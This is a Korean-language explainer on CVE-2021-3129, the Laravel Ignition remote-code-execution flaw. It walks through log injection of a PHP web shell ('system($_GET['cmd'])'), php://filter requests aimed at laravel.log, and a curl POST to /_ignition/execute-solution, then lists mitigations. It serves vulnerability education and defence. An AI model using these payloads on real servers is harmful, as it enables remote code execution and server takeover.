## 🚨 **CVE-2021-3129**

`/_ignition/execute-solution` 경로는 Laravel 프레임워크의 **Ignition 디버거**와 관련된 **디버그 진단/실행 엔드포인트**입니다.
이 경로가 외부에서 접근 가능하다면, **심각한 보안 취약점**으로 이어질 수 있습니다.

| 항목      | 설명                                             |
| ------- | ---------------------------------------------- |
| 🔧 구성요소 | Laravel의 디버깅 도구인 **Ignition**에서 제공             |
| 🧠 기능   | 개발 중 발생한 오류에 대해 **자동 수정 제안**을 실행               |
| 📦 패키지  | `spatie/laravel-ignition` 또는 `facade/ignition` |
| 🔓 위험성  | 외부에서 접근 가능하면 공격자가 **임의의 코드 실행**까지 가능           |


* Laravel 앱이 **디버그 모드(`APP_DEBUG=true`)** 상태일 때
* 해당 Ignition 엔드포인트가 **외부에서 접근 가능할 때**
* 공격자가 **조작된 JSON 요청**으로 **임의 명령 실행**을 시도할 수 있음



### 🔥 공격 예시:

```http
POST /_ignition/execute-solution HTTP/1.1
Content-Type: application/json

{
  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "test',
    ');phpinfo();//"
  }
}
```

→ 이 시도는 **코드 삽입 및 실행** 가능성을 테스트합니다.




## 🔥 **로그 파일을 이용한 RCE** 페이로드 예제


### 🔸 1. 로그 파일에 악성 코드 삽입 (Log Injection)

Laravel은 예외 처리 중 `storage/logs/laravel.log`에 **요청 값**을 기록합니다.

공격자가 아래와 같은 값을 HTTP 요청에 포함시키면:

```php
<?php phpinfo(); ?>
```

→ 이게 `laravel.log` 파일에 그대로 기록됩니다.

---

### 🔸 2. `php://filter`로 로그 파일을 디코딩 없이 읽기

```php
php://filter/read=convert.base64-encode/resource=../storage/logs/laravel.log
```

→ 이건 보통 **파일을 Base64로 인코딩해서 읽기**
(탐지 우회 또는 출력 우회를 위해 사용)

또는

```php
php://filter/read=consumed/resource=...
```

→ `read=consumed`는 [stream wrapper](https://www.php.net/manual/en/wrappers.php.php) 설정 중 **버퍼를 비워서 한 번만 읽기**를 의미합니다. 

---

### 🔸 3. `_ignition/execute-solution`과 조합 시

* Ignition은 오류 발생 시 `solution` 요청을 통해 임의 파일을 로딩 가능
* 이 때 `php://filter/...` 를 전달해 Laravel이 **로그 파일을 코드처럼 실행하게끔 유도**

---

## 🧪 공격 흐름 요약 (CVE-2021-3129)

1. **악성 PHP 코드**를 로그에 주입:

   ```http
   GET /?param=<?php system($_GET['cmd']); ?>
   ```

2. 로그에 코드가 삽입됨

3. `_ignition/execute-solution`에 다음 JSON 전송:

   ```json
   {
     "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
     "parameters": {
       "variableName": "test",
       "viewFile": "php://filter/resource=../storage/logs/laravel.log"
     }
   }
   ```

4. 결과적으로 Laravel이 **로그 파일을 eval()처럼 실행**
   → 웹셸 또는 시스템 명령 실행 가능

---

## 🔥 실제 공격 예시

```bash
curl -X POST http://target.com/_ignition/execute-solution \
  -H "Content-Type: application/json" \
  -d '{
    "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
    "parameters": {
      "variableName": "x",
      "viewFile": "php://filter/resource=../storage/logs/laravel.log"
    }
  }'
```

---

## ✅ 대응 방법 요약

| 조치                          | 설명                                            |
| --------------------------- | --------------------------------------------- |
| 🔒 `APP_DEBUG=false`        | 디버그 모드 비활성화                                   |
| 🔥 `/_ignition/*` 경로 차단     | 웹서버 또는 WAF에서 차단                               |
| 📦 Ignition 패키지 제거 또는 업그레이드 | `composer remove facade/ignition` 또는 최신 버전 적용 |
| 🧹 로그 파일 검증                 | `laravel.log`에 `<?php` 코드가 포함되어 있는지 검사        |
| 🧼 사용자 입력 로그 기록 금지          | `Log::info($request->input())` 등의 코드 주의       |


